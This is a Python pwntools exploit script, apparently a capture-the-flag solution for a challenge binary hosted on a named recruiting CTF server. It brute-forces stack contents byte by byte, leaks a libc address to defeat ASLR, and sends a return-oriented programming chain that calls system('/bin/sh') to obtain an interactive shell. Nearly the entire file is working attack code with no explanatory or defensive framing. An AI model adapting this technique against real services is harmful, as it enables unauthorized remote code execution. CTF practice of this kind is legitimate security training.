#!/usr/bin/python3
from pwn import *

exe = ELF('./a',checksec=False)
libc = ELF('./libc-2.27.so',checksec=False)
#context.binary = exe
#context.log_level='debug'
context.arch='amd64'

def conn():
	if args.REMOTE:
		io=remote('recruit.osiris.cyber.nyu.edu',6161)
	else:
		io=process('./a',env={"LD_PRELOAD":"/home/hermes/Downloads/libc-2.27.so"})
	return io

io = conn()
#io = remote('recruit.osiris.cyber.nyu.edu',6161)
stack=b'\xde\xad\xbe\xef\xca\xfe\xba\xbe'
#gdb.attach(io)
for i in range(9,33):
	for j in range(0,256):
		if 9<=j<=13 or j==32:
			continue
		io.sendline(b'1')
		io.sendline(str(i).encode())
		io.sendline(stack+p8(j))
		res=io.recvline().decode()
		if "found" in res:
			stack += p8(j)
			print(stack)
			break
		else:
			continue
#gdb.attach(io)
libc_leak = stack[24:32]
#libc.address=u64(libc_leak.ljust(8,b'\x00')) - 0x21c87
libc.address=u64(libc_leak.ljust(8,b'\x00'))-libc.symbols['__libc_start_main']-231
info("Libc base:%#x\n", libc.address)

rdi = 0x000000000002155f+libc.address
#rdi = 0x000000000002164f + libc.address
rsi = 0x0000000000023e6a+libc.address
rdx = 0x0000000000001b96+libc.address
bin_sh = 0x00000000001b3e9a+libc.address
system = 0x4f443+libc.address
ret = 0x8aa+libc.address

info("system: "+str(hex(libc.sym['system'])))
info("/bin/sh: "+str(hex(bin_sh)))

io.sendline(b'2')
#io.sendline(b'80')
#io.sendline(flat(stack[:24], rdi, next(libc.search(b"/bin/sh\x00")), rsi, 0, rdx, 0, libc.symbols['execve']))
io.sendline(b'56')
io.sendline(flat(stack[:24], rdi, next(libc.search(b"/bin/sh\x00")), ret, libc.symbols['system']))

#gdb.attach(io)

io.sendline(b'5')
io.recvline()

#gdb.attach(io)

io.interactive()
